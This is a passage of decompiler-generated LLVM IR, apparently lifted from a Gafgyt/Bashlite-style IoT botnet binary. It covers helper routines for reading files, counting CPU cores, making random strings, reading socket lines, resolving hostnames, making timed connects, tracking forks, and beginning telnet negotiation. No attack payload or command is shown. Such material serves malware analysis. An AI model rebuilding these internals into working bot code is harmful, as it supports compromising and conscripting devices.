dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c70.preheader, %dec_label_pc_9c48
  %v3_9c78 = call i32 @strlen(i8* %storemerge2)
  %v1_9c8c = add i32 %v3_9c78, %v2_9c88
  %v1_9c90 = inttoptr i32 %v1_9c8c to i8*
  %v2_9c90 = load i8, i8* %v1_9c90, align 1
  %v7_9c94 = icmp eq i8 %v2_9c90, 13
  br i1 %v7_9c94, label %dec_label_pc_9c48, label %dec_label_pc_9c9c

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9c70
  %v3_9ca4 = call i32 @strlen(i8* %storemerge2)
  %v1_9cb8 = add i32 %v3_9ca4, %v2_9c88
  %v1_9cbc = inttoptr i32 %v1_9cb8 to i8*
  %v2_9cbc = load i8, i8* %v1_9cbc, align 1
  %v7_9cc0 = icmp eq i8 %v2_9cbc, 10
  br i1 %v7_9cc0, label %dec_label_pc_9c48, label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9c9c
  %v2_9cd4 = call i32 @__GI_strchr(i32 %v4_9c14, i32 46)
  %v2_9cdc = icmp eq i32 %v2_9cd4, 0
  br i1 %v2_9cdc, label %dec_label_pc_9d00, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9cc8
  %v2_9cf0 = call i32 @__GI_strchr(i32 %v4_9c14, i32 46)
  %v3_9cfc = inttoptr i32 %v2_9cf0 to i8*
  store i8 0, i8* %v3_9cfc, align 1
  br label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cc8, %dec_label_pc_9ce4
  %v3_9d1c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9d24 = call i32 @__libc_close(i32 %v4_9b98)
  br label %dec_label_pc_9d90

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9ba8
  store i32 4096, i32* @r2, align 4
  %v3_9d50 = call i32 @__GI_memset(i8* %v1_9bb8, i32 0)
  br label %dec_label_pc_9d54

dec_label_pc_9d54:                                ; preds = %entry, %dec_label_pc_9d38
  %v4_9d6c = call i32 @fdgets(i32 %v2_9d5c, i32 4096, i32 %v4_9b98, i32 %v2_9d5c)
  %v2_9d74 = icmp eq i32 %v4_9d6c, 0
  br i1 %v2_9d74, label %dec_label_pc_9d7c, label %dec_label_pc_9ba8

dec_label_pc_9d7c:                                ; preds = %dec_label_pc_9d54
  %v1_9d80 = call i32 @__libc_close(i32 %v4_9b98)
  br label %dec_label_pc_9d90

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d00, %dec_label_pc_9d7c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_9d7c ], [ 0, %dec_label_pc_9d00 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9c88, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_9d5c, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9b98, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9d90, { 1, 0 }
  uselistorder label %dec_label_pc_9d54, { 1, 0 }
  uselistorder label %dec_label_pc_9d00, { 1, 0 }
  uselistorder label %dec_label_pc_9c70, { 1, 0 }
  uselistorder label %dec_label_pc_9c14, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9dbc = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9dd0 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e5b4.65, i32 0, i32 0), i32 0)
  %v1_9df0 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9e4c

dec_label_pc_9de0:                                ; preds = %dec_label_pc_9e4c
  %v2_9df0 = call i32 @uppercase(i8* %v1_9df0)
  %v4_9e08 = call i32 @strstr(i32 %v2_9dbc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e5c4.67, i32 0, i32 0))
  %v9_9e1c = icmp eq i32 %v4_9e08, %v2_9dbc
  br i1 %v9_9e1c, label %dec_label_pc_9e24, label %dec_label_pc_9e30

dec_label_pc_9e24:                                ; preds = %dec_label_pc_9de0
  %v1_9e28 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9e30

dec_label_pc_9e30:                                ; preds = %dec_label_pc_9de0, %dec_label_pc_9e24
  %stack_var_-24.0 = phi i32 [ %v1_9e28, %dec_label_pc_9e24 ], [ %stack_var_-24.1, %dec_label_pc_9de0 ]
  store i32 4096, i32* @r2, align 4
  %v3_9e48 = call i32 @__GI_memset(i8* %v1_9df0, i32 0)
  br label %dec_label_pc_9e4c

dec_label_pc_9e4c:                                ; preds = %entry, %dec_label_pc_9e30
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9e30 ]
  %v4_9e64 = call i32 @fdgets(i32 %v2_9dbc, i32 4096, i32 %v4_9dd0, i32 %v2_9dbc)
  %v2_9e6c = icmp eq i32 %v4_9e64, 0
  br i1 %v2_9e6c, label %dec_label_pc_9e74, label %dec_label_pc_9de0

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e4c
  %v1_9e78 = call i32 @__libc_close(i32 %v4_9dd0)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9dbc, { 0, 3, 1, 2 }
  uselistorder i32 (i8*)* @uppercase, { 1, 0 }
  uselistorder label %dec_label_pc_9e4c, { 1, 0 }
  uselistorder label %dec_label_pc_9e30, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_9ea4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_9f1017 = icmp sgt i32 %arg2, 0
  br i1 %v5_9f1017, label %dec_label_pc_9ec0, label %dec_label_pc_9f14

dec_label_pc_9ec0:                                ; preds = %entry, %dec_label_pc_9ec0
  %storemerge118 = phi i32 [ %v1_9efc, %dec_label_pc_9ec0 ], [ 0, %entry ]
  %v2_9ecc = add i32 %storemerge118, %v0_9ea4
  store i32 %v2_9ecc, i32* @r4, align 4
  %v0_9ed0 = call i32 @rand_cmwc()
  %v2_9ee0 = urem i32 %v0_9ed0, 26
  store i32 %v2_9ee0, i32* %r0.global-to-local, align 4
  %v1_9eec = add nuw nsw i32 %v2_9ee0, 65
  %v1_9ef4 = trunc i32 %v1_9eec to i8
  %v2_9ef4 = load i32, i32* @r4, align 4
  %v3_9ef4 = inttoptr i32 %v2_9ef4 to i8*
  store i8 %v1_9ef4, i8* %v3_9ef4, align 1
  %v1_9efc = add i32 %storemerge118, 1
  %v3_9f08.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9f10 = icmp slt i32 %v1_9efc, %v3_9f08.pre
  br i1 %v5_9f10, label %dec_label_pc_9ec0, label %dec_label_pc_9f04.dec_label_pc_9f14_crit_edge

dec_label_pc_9f04.dec_label_pc_9f14_crit_edge:    ; preds = %dec_label_pc_9ec0
  %v12_9f18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f14

dec_label_pc_9f14:                                ; preds = %dec_label_pc_9f04.dec_label_pc_9f14_crit_edge, %entry
  %v12_9f18 = phi i32 [ %v12_9f18.pre, %dec_label_pc_9f04.dec_label_pc_9f14_crit_edge ], [ %v0_9ea4, %entry ]
  ret i32 %v12_9f18

; uselistorder directives
  uselistorder i32 %v1_9efc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9ec0, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9f70.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9f20 = load i32, i32* @fp, align 4
  store i32 %v3_9f20, i32* %stack_var_-16, align 4
  store i32 40744, i32* %stack_var_-4, align 4
  %v2_9f24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f24, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9f48 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9f5c = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %dec_label_pc_9f70.lr.ph, %dec_label_pc_9f70
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9f70.lr.ph ], [ %v1_9f84, %dec_label_pc_9f70 ]
  %v5_9f7c = mul nuw nsw i32 %storemerge628, 4
  %v6_9f7c = add i32 %v5_9f7c, %v2_9f5c
  %v7_9f7c = inttoptr i32 %v6_9f7c to i32*
  store i32 0, i32* %v7_9f7c, align 4
  %v1_9f84 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9f84, 32
  br i1 %tmp53, label %dec_label_pc_9f70, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f70
  %v13_9f20 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9f9c = udiv i32 %arg1, 32
  %v3_9fa8 = mul nuw nsw i32 %v3_9f9c, 4
  %v2_9fb0 = add nsw i32 %v3_9fa8, -160
  %v2_9fb4 = add i32 %v2_9fb0, %v13_9f20
  %v1_9fb8 = inttoptr i32 %v2_9fb4 to i32*
  %v2_9fb8 = load i32, i32* %v1_9fb8, align 4
  %v1_9fc0 = urem i32 %arg1, 32
  %v6_9fc8 = shl i32 1, %v1_9fc0
  %v2_9fcc = or i32 %v2_9fb8, %v6_9fc8
  store i32 %v2_9fcc, i32* %v1_9fb8, align 4
  %v1_9fec = add i32 %arg1, 1
  %v2_9ff8 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_a00c = call i32 @__libc_select(i32 %v1_9fec, i32 %v2_9f5c, i32 0, i32 %v2_9f5c, i32 %v2_9ff8)
  %v5_a020 = icmp sgt i32 %v5_a00c, 0
  br i1 %v5_a020, label %dec_label_pc_a1b4.preheader, label %dec_label_pc_a120.preheader

dec_label_pc_a120.preheader:                      ; preds = %dec_label_pc_9f98
  %v7_a12824 = icmp slt i32 %tmp34, 10
  br i1 %v7_a12824, label %dec_label_pc_a060.lr.ph, label %dec_label_pc_a1b4.preheader

dec_label_pc_a060.lr.ph:                          ; preds = %dec_label_pc_a120.preheader, %dec_label_pc_a114
  %stack_var_-44.025 = phi i32 [ %v1_a118, %dec_label_pc_a114 ], [ %tmp34, %dec_label_pc_a120.preheader ]
  %v2_a02c = load i32, i32* @global_var_29910.71, align 4
  %v3_a038 = call i32 @sockprintf(i32 %v2_a02c, i32 ptrtoint ([5 x i8]* @global_var_1e5d0.73 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a060.lr.ph, %dec_label_pc_a060
  %storemerge716 = phi i32 [ 0, %dec_label_pc_a060.lr.ph ], [ %v1_a074, %dec_label_pc_a060 ]
  %v5_a06c = mul nuw nsw i32 %storemerge716, 4
  %v6_a06c = add i32 %v5_a06c, %v2_9f5c
  %v7_a06c = inttoptr i32 %v6_a06c to i32*
  store i32 0, i32* %v7_a06c, align 4
  %v1_a074 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_a074, 32
  br i1 %tmp54, label %dec_label_pc_a060, label %dec_label_pc_a088

dec_label_pc_a088:                                ; preds = %dec_label_pc_a060
  %v2_a0a8 = load i32, i32* %v1_9fb8, align 4
  %v2_a0bc = or i32 %v2_a0a8, %v6_9fc8
  store i32 %v2_a0bc, i32* %v1_9fb8, align 4
  store i32 0, i32* @r2, align 4
  %v5_a0fc = call i32 @__libc_select(i32 %v1_9fec, i32 %v2_9f5c, i32 0, i32 %v2_9f5c, i32 %v2_9ff8)
  %v5_a110 = icmp sgt i32 %v5_a0fc, 0
  br i1 %v5_a110, label %dec_label_pc_a1b4.preheader, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a088
  %v1_a118 = add nsw i32 %stack_var_-44.025, 1
  %v7_a128 = icmp slt i32 %v1_a118, 10
  br i1 %v7_a128, label %dec_label_pc_a060.lr.ph, label %dec_label_pc_a1b4.preheader

dec_label_pc_a1b4.preheader:                      ; preds = %dec_label_pc_a114, %dec_label_pc_a088, %dec_label_pc_a120.preheader, %dec_label_pc_9f98
  %v5_a15c = bitcast i8* %stack_var_-185 to i32*
  %not.v7_a1bc58 = icmp sgt i32 %arg3, 1
  %v2_a1d460 = icmp eq i1 %not.v7_a1bc58, false
  br i1 %v2_a1d460, label %dec_label_pc_a1dc, label %dec_label_pc_a140

dec_label_pc_a140:                                ; preds = %dec_label_pc_a1b4.preheader, %dec_label_pc_a1a8
  %v1_a1b863.in = phi i32 [ %v1_a1b863, %dec_label_pc_a1a8 ], [ %arg3, %dec_label_pc_a1b4.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_a198, %dec_label_pc_a1a8 ], [ %arg2, %dec_label_pc_a1b4.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_a1ac, %dec_label_pc_a1a8 ], [ 0, %dec_label_pc_a1b4.preheader ]
  %v1_a1b863 = add i32 %v1_a1b863.in, -1
  %v2_a144 = load i32, i32* @global_var_29910.71, align 4
  %v6_a15c = call i32 @__libc_recv(i32 %v2_a144, i32* %v5_a15c, i32 1, i32 0)
  %v7_a164 = icmp eq i32 %v6_a15c, 1
  br i1 %v7_a164, label %dec_label_pc_a184, label %dec_label_pc_a16c

dec_label_pc_a16c:                                ; preds = %dec_label_pc_a140
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_a1f0

dec_label_pc_a184:                                ; preds = %dec_label_pc_a140
  %v3_a184 = load i8, i8* %stack_var_-185, align 1
  %v4_a188 = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_a184, i8* %stack_var_-40.062, align 1
  %v1_a194 = add i32 %v4_a188, 1
  %v5_a198 = inttoptr i32 %v1_a194 to i8*
  %v3_a19c = load i8, i8* %stack_var_-185, align 1
  %v7_a1a0 = icmp eq i8 %v3_a19c, 10
  br i1 %v7_a1a0, label %dec_label_pc_a1dc, label %dec_label_pc_a1a8

dec_label_pc_a1a8:                                ; preds = %dec_label_pc_a184
  %v1_a1ac = add i32 %stack_var_-36.061, 1
  %not.v7_a1bc = icmp sgt i32 %v1_a1b863, 1
  %v2_a1d4 = icmp eq i1 %not.v7_a1bc, false
  br i1 %v2_a1d4, label %dec_label_pc_a1dc, label %dec_label_pc_a140

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a184, %dec_label_pc_a1a8, %dec_label_pc_a1b4.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_a1b4.preheader ], [ %v1_a1ac, %dec_label_pc_a1a8 ], [ %stack_var_-36.061, %dec_label_pc_a184 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_a1b4.preheader ], [ %v5_a198, %dec_label_pc_a1a8 ], [ %v5_a198, %dec_label_pc_a184 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a16c, %dec_label_pc_a1dc
  %storemerge = phi i32 [ -1, %dec_label_pc_a16c ], [ %stack_var_-36.0.lcssa, %dec_label_pc_a1dc ]
  %v2_a1fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_a1fc, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_a118, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9f5c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a1f0, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a140, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a060.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9f70, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 41492, i32* %stack_var_-4, align 4
  %v2_a210 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a210, i32* @fp, align 4
  %v1_a224 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_a234 = icmp eq i32 %v1_a224, 0
  br i1 %v2_a234, label %dec_label_pc_a23c, label %dec_label_pc_a250

dec_label_pc_a23c:                                ; preds = %entry
  %v3_a240 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e5d8.75, i32 0, i32 0))
  br label %dec_label_pc_a2c8

dec_label_pc_a250:                                ; preds = %entry
  %v1_a254 = add i32 %v1_a224, 16
  %v2_a254 = inttoptr i32 %v1_a254 to i32*
  %v3_a254 = load i32, i32* %v2_a254, align 4
  %v1_a278 = inttoptr i32 %v3_a254 to i32*
  %v2_a278 = load i32, i32* %v1_a278, align 4
  %v2_a27c = icmp eq i32 %v2_a278, 0
  br i1 %v2_a27c, label %dec_label_pc_a2c0, label %dec_label_pc_a284

dec_label_pc_a284:                                ; preds = %dec_label_pc_a250
  %v2_a298 = load i32, i32* %v1_a278, align 4
  %v1_a29c = inttoptr i32 %v2_a298 to i32*
  %v2_a29c = load i32, i32* %v1_a29c, align 4
  store i32 %v2_a29c, i32* @r0, align 4
  %v1_a2a0 = call i32 @__GI_inet_ntoa(i32 %v2_a29c)
  %v2_a2b0 = inttoptr i32 %v1_a2a0 to i8*
  %v3_a2b0 = call i32 @strcpy(i32 %arg2, i8* %v2_a2b0)
  br label %dec_label_pc_a2c8

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a250
  br label %dec_label_pc_a2c8

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a284, %dec_label_pc_a23c, %dec_label_pc_a2c0
  %v3_a2c8 = phi i32 [ 0, %dec_label_pc_a284 ], [ 1, %dec_label_pc_a23c ], [ 1, %dec_label_pc_a2c0 ]
  ret i32 %v3_a2c8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a2c8, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a2e0 = load i32, i32* @fp, align 4
  store i32 %v3_a2e0, i32* %stack_var_-16, align 4
  %v13_a2e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a318 = or i32 %v2_a308, 2048
  store i32 %v1_a318, i32* @r2, align 4
  %v2_a32c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a348 = urem i32 %arg3, 65536
  %v1_a350 = call i32 @htons(i32 %v3_a348)
  %v3_a378 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a380 = icmp eq i32 %v3_a378, 0
  br i1 %v2_a380, label %dec_label_pc_a394, label %dec_label_pc_a388

dec_label_pc_a388:                                ; preds = %entry
  br label %dec_label_pc_a54c

dec_label_pc_a394:                                ; preds = %entry
  %v3_a3bc = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_a3bc = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_a3bc, i32 16)
  %v1_a3cc = icmp slt i32 %v4_a3bc, 0
  br i1 %v1_a3cc, label %dec_label_pc_a3d4, label %dec_label_pc_a510

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a394
  %v0_a3d4 = call i32 @__errno_location()
  %v1_a3dc = inttoptr i32 %v0_a3d4 to i32*
  %v2_a3dc = load i32, i32* %v1_a3dc, align 4
  %v7_a3e0 = icmp eq i32 %v2_a3dc, 115
  br i1 %v7_a3e0, label %dec_label_pc_a40c.lr.ph, label %dec_label_pc_a504

dec_label_pc_a40c.lr.ph:                          ; preds = %dec_label_pc_a3d4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a3f8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a40c.lr.ph, %dec_label_pc_a40c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a40c.lr.ph ], [ %v1_a420, %dec_label_pc_a40c ]
  %v5_a418 = mul nuw nsw i32 %storemerge14, 4
  %v6_a418 = add i32 %v5_a418, %v2_a3f8
  %v7_a418 = inttoptr i32 %v6_a418 to i32*
  store i32 0, i32* %v7_a418, align 4
  %v1_a420 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_a420, 32
  br i1 %tmp32, label %dec_label_pc_a40c, label %dec_label_pc_a434

dec_label_pc_a434:                                ; preds = %dec_label_pc_a40c
  %v3_a438 = udiv i32 %arg1, 32
  %v3_a444 = mul nuw nsw i32 %v3_a438, 4
  %v2_a44c = add nsw i32 %v3_a444, -160
  %v2_a450 = add i32 %v2_a44c, %v13_a2e0
  %v1_a454 = inttoptr i32 %v2_a450 to i32*
  %v2_a454 = load i32, i32* %v1_a454, align 4
  %v1_a45c = urem i32 %arg1, 32
  %v6_a464 = shl i32 1, %v1_a45c
  %v2_a468 = or i32 %v2_a454, %v6_a464
  store i32 %v2_a468, i32* %v1_a454, align 4
  %v1_a488 = add i32 %arg1, 1
  %v2_a490 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a4a8 = call i32 @__libc_select(i32 %v1_a488, i32 0, i32 %v2_a3f8, i32 0, i32 %v2_a490)
  %tmp33 = icmp slt i32 %v5_a4a8, 1
  br i1 %tmp33, label %dec_label_pc_a4f8, label %dec_label_pc_a4b8

dec_label_pc_a4b8:                                ; preds = %dec_label_pc_a434
  %v0_a4dc = call i32 @getsockopt()
  %v3_a4e0 = load i32, i32* %stack_var_-192, align 4
  %v2_a4e4 = icmp eq i32 %v3_a4e0, 0
  br i1 %v2_a4e4, label %dec_label_pc_a510, label %dec_label_pc_a4ec

dec_label_pc_a4ec:                                ; preds = %dec_label_pc_a4b8
  br label %dec_label_pc_a54c

dec_label_pc_a4f8:                                ; preds = %dec_label_pc_a434
  br label %dec_label_pc_a54c

dec_label_pc_a504:                                ; preds = %dec_label_pc_a3d4
  br label %dec_label_pc_a54c

dec_label_pc_a510:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a4b8
  store i32 0, i32* @r2, align 4
  %v2_a51c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a52c = and i32 %v2_a51c, -2049
  store i32 %v1_a52c, i32* @r2, align 4
  %v2_a540 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a504, %dec_label_pc_a4f8, %dec_label_pc_a4ec, %dec_label_pc_a388, %dec_label_pc_a510
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a4f8 ], [ 1, %dec_label_pc_a510 ], [ 0, %dec_label_pc_a4ec ], [ 0, %dec_label_pc_a504 ], [ 0, %dec_label_pc_a388 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a3f8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a54c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a510, { 1, 0 }
  uselistorder label %dec_label_pc_a40c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a55c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a55c, i32* @ip, align 4
  %v3_a560 = load i32, i32* @r4, align 4
  %v6_a560 = load i32, i32* @r5, align 4
  %v9_a560 = load i32, i32* @r6, align 4
  %v0_a56c = call i32 @__libc_fork()
  %v2_a57c = icmp eq i32 %v0_a56c, 0
  br i1 %v2_a57c, label %dec_label_pc_a6dc, label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %entry
  %v2_a594 = load i32, i32* @global_var_29914.77, align 4
  %v5_a594 = load i32, i32* @global_var_29918.78, align 4
  %v2_a5a0 = add i32 %v2_a594, 1
  %v3_a5a0 = icmp eq i32 %v2_a5a0, 0
  %v4_a5a4 = zext i1 %v3_a5a0 to i32
  %v5_a5a4 = add i32 %v4_a5a4, %v5_a594
  store i32 %v2_a5a0, i32* @global_var_29914.77, align 4
  store i32 %v5_a5a4, i32* @global_var_29918.78, align 4
  %v3_a5b8 = udiv i32 %v2_a5a0, 1073741824
  %v3_a5bc = mul i32 %v5_a5a4, 4
  %v2_a5c0 = or i32 %v3_a5bc, %v3_a5b8
  store i32 %v2_a5c0, i32* @r4, align 4
  %v3_a5c4 = mul i32 %v2_a5a0, 4
  %v1_a5c8 = add i32 %v3_a5c4, 4
  %v1_a5d0 = call i32 @malloc(i32 %v1_a5c8)
  br label %dec_label_pc_a628

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a628, %dec_label_pc_a674
  %v3_a5ec = mul i32 %storemerge3, 4
  %v2_a5f8 = add i32 %v3_a5ec, %v1_a5d0
  %v2_a60c = load i32, i32* @global_var_2fb94.80, align 4
  %v2_a610 = add i32 %v2_a60c, %v3_a5ec
  %v1_a614 = inttoptr i32 %v2_a610 to i32*
  %v2_a614 = load i32, i32* %v1_a614, align 4
  %v2_a618 = inttoptr i32 %v2_a5f8 to i32*
  store i32 %v2_a614, i32* %v2_a618, align 4
  %v1_a620 = add i32 %storemerge3, 1
  br label %dec_label_pc_a628

dec_label_pc_a628:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a5e8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_a590 ], [ %v1_a620, %dec_label_pc_a5e8 ]
  %v2_a640 = load i32, i32* @global_var_29914.77, align 4
  %v5_a640 = load i32, i32* @global_var_29918.78, align 4
  %v2_a654 = add i32 %v2_a640, -1
  %v3_a654 = icmp ne i32 %v2_a640, 0
  %v3_a658 = add i32 %v5_a640, -1
  %v5_a658 = sext i1 %v3_a654 to i32
  %v9_a66c = icmp eq i32 %v3_a658, %v5_a658
  br i1 %v9_a66c, label %dec_label_pc_a674, label %dec_label_pc_a5e8

dec_label_pc_a674:                                ; preds = %dec_label_pc_a628
  store i32 %v2_a654, i32* @r5, align 4
  store i32 %storemerge3, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a654, %storemerge3
  br i1 %tmp, label %dec_label_pc_a5e8, label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a674
  store i32 %v5_a640, i32* @r4, align 4
  %v3_a69c = mul i32 %v2_a640, 4
  %v2_a6a8 = add i32 %v1_a5d0, -4
  %v1_a6ac = add i32 %v2_a6a8, %v3_a69c
  %v2_a6b4 = inttoptr i32 %v1_a6ac to i32*
  store i32 %v0_a56c, i32* %v2_a6b4, align 4
  %v2_a6bc = load i32, i32* @global_var_2fb94.80, align 4
  %v1_a6c4 = call i32 @free(i32 %v2_a6bc)
  store i32 %v1_a5d0, i32* @global_var_2fb94.80, align 4
  br label %dec_label_pc_a6dc

dec_label_pc_a6dc:                                ; preds = %entry, %dec_label_pc_a694
  store i32 %v3_a560, i32* @r4, align 4
  store i32 %v6_a560, i32* @r5, align 4
  store i32 %v9_a560, i32* @r6, align 4
  ret i32 %v0_a56c

; uselistorder directives
  uselistorder i32 %storemerge3, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a5ec, { 1, 0 }
  uselistorder i32 %v1_a5d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a6dc, { 1, 0 }
  uselistorder label %dec_label_pc_a628, { 1, 0 }
  uselistorder label %dec_label_pc_a5e8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a714 = add i32 %arg2, 1
  %v1_a718 = inttoptr i32 %v1_a714 to i8*
  %v2_a718 = load i8, i8* %v1_a718, align 1
  %v7_a724 = icmp ult i8 %v2_a718, -5
